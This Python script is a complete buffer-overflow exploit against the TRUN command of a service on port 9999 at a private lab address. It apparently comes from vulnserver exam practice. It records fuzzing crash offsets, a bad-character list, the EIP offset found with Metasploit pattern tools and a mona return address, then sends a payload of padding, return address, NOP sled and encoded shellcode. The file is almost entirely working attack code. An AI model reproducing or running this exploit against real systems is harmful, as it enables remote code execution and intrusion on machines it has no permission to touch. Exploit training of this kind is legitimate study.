#!/usr/bin/python 
import socket
import sys
import struct

host= '192.168.103.143'
port = 9999

try:
	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

except:
	print "socket() failed"
	sys.exit(1)
pre="TRUN /.:/"
junk="A"*2000
#**************************
#Manual Fuzzing after BooFuzz
#5067,7000,4000,3000,2500,10000: overwrite EIP, NO SEH
#2000: NO EIP NO SEH
#1000-1950: NO CRASH
#**************************

#BadChars: \x00
#note, had to use 2000 chars otherwise buffer wouldnt contain badchars
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
#muha=pre+junk+"W00T"+badchar
#root@kali:~/osce/fuzzexample# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
pattern=""
#muha=pre+pattern
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
#[*] Exact match at offset 2003
junk="A"*2003
#mona modules, 625011AF
#3D7 buffer
EIP="\xAF\x11\x50\x62"
buf =  "W00TW00T"
buf += "\xbb\x2f\xbb\x87\x1b\xdb\xd4\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x75\xb5\x65"
buf += "\xee\x75\x21\xeb\x11\x85\xb2\x8c\x98\x60\x83\x8c\xff"
buf += "\xe1\xb4\x3c\x8b\xa7\x38\xb6\xd9\x53\xca\xba\xf5\x54"
buf += "\x7b\x70\x20\x5b\x7c\x29\x10\xfa\xfe\x30\x45\xdc\x3f"
buf += "\xfb\x98\x1d\x07\xe6\x51\x4f\xd0\x6c\xc7\x7f\x55\x38"
buf += "\xd4\xf4\x25\xac\x5c\xe9\xfe\xcf\x4d\xbc\x75\x96\x4d"
buf += "\x3f\x59\xa2\xc7\x27\xbe\x8f\x9e\xdc\x74\x7b\x21\x34"
buf += "\x45\x84\x8e\x79\x69\x77\xce\xbe\x4e\x68\xa5\xb6\xac"
buf += "\x15\xbe\x0d\xce\xc1\x4b\x95\x68\x81\xec\x71\x88\x46"
buf += "\x6a\xf2\x86\x23\xf8\x5c\x8b\xb2\x2d\xd7\xb7\x3f\xd0"
buf += "\x37\x3e\x7b\xf7\x93\x1a\xdf\x96\x82\xc6\x8e\xa7\xd4"
buf += "\xa8\x6f\x02\x9f\x45\x7b\x3f\xc2\x01\x48\x72\xfc\xd1"
buf += "\xc6\x05\x8f\xe3\x49\xbe\x07\x48\x01\x18\xd0\xaf\x38"
buf += "\xdc\x4e\x4e\xc3\x1d\x47\x95\x97\x4d\xff\x3c\x98\x05"
buf += "\xff\xc1\x4d\x89\xaf\x6d\x3e\x6a\x1f\xce\xee\x02\x75"
buf += "\xc1\xd1\x33\x76\x0b\x7a\xd9\x8d\xdc\x45\xb6\xeb\x29"
buf += "\x2e\xc5\xf3\x50\x15\x40\x15\x38\x79\x05\x8e\xd5\xe0"
buf += "\x0c\x44\x47\xec\x9a\x21\x47\x66\x29\xd6\x06\x8f\x44"
buf += "\xc4\xff\x7f\x13\xb6\x56\x7f\x89\xde\x35\x12\x56\x1e"
buf += "\x33\x0f\xc1\x49\x14\xe1\x18\x1f\x88\x58\xb3\x3d\x51"
buf += "\x3c\xfc\x85\x8e\xfd\x03\x04\x42\xb9\x27\x16\x9a\x42"
buf += "\x6c\x42\x72\x15\x3a\x3c\x34\xcf\x8c\x96\xee\xbc\x46"
buf += "\x7e\x76\x8f\x58\xf8\x77\xda\x2e\xe4\xc6\xb3\x76\x1b"
buf += "\xe6\x53\x7f\x64\x1a\xc4\x80\xbf\x9e\xf4\xca\x9d\xb7"
buf += "\x9c\x92\x74\x8a\xc0\x24\xa3\xc9\xfc\xa6\x41\xb2\xfa"
buf += "\xb7\x20\xb7\x47\x70\xd9\xc5\xd8\x15\xdd\x7a\xd8\x3f"
shell=buf
NOPS="\x90"*20


filler="C"*(5000-len(junk)-len(shell)-len(NOPS))

muha=pre+junk+EIP+NOPS+shell+filler
s.connect((host,port))
s.recv(1024)
s.send(muha)
s.close()
